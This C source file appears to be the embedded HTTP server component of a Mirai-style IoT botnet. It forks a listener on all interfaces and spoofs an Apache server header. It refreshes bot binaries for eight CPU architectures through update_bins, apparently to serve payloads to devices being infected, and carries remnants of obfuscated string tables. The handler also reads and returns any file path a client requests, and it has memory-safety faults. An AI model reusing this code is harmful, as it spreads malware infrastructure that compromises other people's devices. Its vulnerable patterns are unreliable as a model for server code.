#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#include "includes.h"
#include "util.h"
//#include "enc.h"

int httpd_pid = -1;

int httpd_stop(void)
{
	if (httpd_pid != -1)
	{
		kill(httpd_pid, 9);
		httpd_pid = -1;
	}
}

int httpd_getpid(void)
{
	return httpd_pid;
}

char *parse_request(char *request)
{
  char *query_line;
  if(strstr(request, "GET /"))
  {
    query_line = strstr(request, "GET /") + 5;
  }
  if(strstr(request, "HEAD /"))
  {
    query_line = strstr(request, "HEAD /") + 6;
  }
  if(strstr(request, "POST /"))
  {
    query_line = strstr(request, "POST /") + 6;
  }

  char *token = strtok(query_line, " ");
  #ifdef DEBUG
  printf("token: %s\n", token);
  #endif
  return token;
}

void httpd_serve(int socket, char *request)
{
	int i = 0, fd_file;
    struct stat sbuf;
  	char sendbuf[1024];
    #ifdef DEBUG
    printf("[httpd] request received: %s\n", request);
    #endif

  	if (stat(parse_request(request), &sbuf) < 0)
  	{
#ifdef DEBUG
		  printf("[httpd] failed to stat request file\r\n");
#endif
      write(socket, "HTTP/1.1 404 Not Found", util_strlen("HTTP/1.1 404 Not Found"));
      write(socket, "\r\n", 2);

      //enc_switch(http_server, key, ENC_DECRYPT);
      write(socket, "Server: Apache", util_strlen("Server: Apache"));
      write(socket, "\r\n", 2);

      //enc_switch(http_content_length, key, ENC_DECRYPT);
      write(socket, "Content-Length: ", util_strlen("Content-Length: "));
      sprintf(sendbuf, " %d\n\r\n", (int)sbuf.st_size);
      write(socket, sendbuf, util_strlen(sendbuf));
      memset(sendbuf, 0, sizeof(sendbuf));
	    return;
  	}

  	memset(sendbuf, 0, sizeof(sendbuf));

	//enc_switch(http_200_ok, key, ENC_DECRYPT);
  write(socket, "HTTP/1.1 200 OK", util_strlen("HTTP/1.1 200 OK"));
	write(socket, "\r\n", 2);

	//enc_switch(http_server, key, ENC_DECRYPT);
	write(socket, "Server: Apache", util_strlen("Server: Apache"));
	write(socket, "\r\n", 2);

	//enc_switch(http_content_length, key, ENC_DECRYPT);
	write(socket, "Content-Length: ", util_strlen("Content-Length: "));
	sprintf(sendbuf, " %d\n\r\n", (int)sbuf.st_size);
  write(socket, sendbuf, util_strlen(sendbuf));
  memset(sendbuf, 0, sizeof(sendbuf));

    char filebuf[(int)sbuf.st_size];
    memset(filebuf, 0, sizeof(filebuf));

	//enc_switch(proc_self_exe, key, ENC_DECRYPT);
    if ((fd_file = open(parse_request(request),  O_RDONLY)) == -1)
    {
#ifdef DEBUG
		printf("[httpd] failed to open /proc/self/exe\r\n");
#endif
    	return;
    }

	if (read(fd_file, filebuf, (int)sbuf.st_size) != (int)sbuf.st_size)
	{
#ifdef DEBUG
		printf("[httpd] file size does not match read() return val\r\n");
#endif
		return;
	}

	write(socket, filebuf, (int)sbuf.st_size);
    memset(filebuf, 0, sizeof(filebuf));
}

void httpd_conn(int socket)
{
  	while (1)
  	{
  		char tmpbuffer[1024];
  		memset(tmpbuffer, 0, sizeof(tmpbuffer));

    	int len = recv(socket, tmpbuffer, sizeof(tmpbuffer), 0);
    	if (len < 1)
      		break;

    	httpd_serve(socket, tmpbuffer);
    	memset(tmpbuffer, 0, sizeof(tmpbuffer));
    	break;
  	}
}

void httpd_start(int port)
{
    int fd_socket, fd_client;
  	socklen_t addrlen = sizeof(struct sockaddr_in);
  	struct sockaddr_in sock_addr;
	 uint32_t parent;
    parent = fork();

  	if (parent > 0)
  	{
  		httpd_pid = parent;
  		return;
  	}
    else if (parent == -1)
    	return;

  	sock_addr.sin_port = htons(port);
  	sock_addr.sin_family = AF_INET;
  	sock_addr.sin_addr.s_addr = INADDR_ANY;

  	if ((fd_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)) == -1)
  		_exit(0);

  	if (setsockopt(fd_socket, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0)
  	{
  		close(fd_socket);
    	_exit(0);
  	}

  	if (bind(fd_socket, (const struct sockaddr *)&sock_addr, addrlen) != 0)
  	{
  		close(fd_socket);
    	_exit(0);
  	}

  	if (listen(fd_socket, 5) != 0)
  	{
  		close(fd_socket);
    	_exit(0);
  	}

#ifdef DEBUG
		printf("[httpd] server started on port %d, listening for connections\r\n", port);
#else
    int j;
    for(j = 0; j < 8; j++)
        update_bins(arch_names[j], NULL); 
#endif
  	while ((fd_client = accept(fd_socket, (struct sockaddr *)&sock_addr, &addrlen)) != -1)
  	{
#ifdef DEBUG
		printf("[httpd] connection established\r\n");
#endif
    	httpd_conn(fd_client);
    	close(fd_client);
  	}

  	close(fd_socket);
  	_exit(0);
}
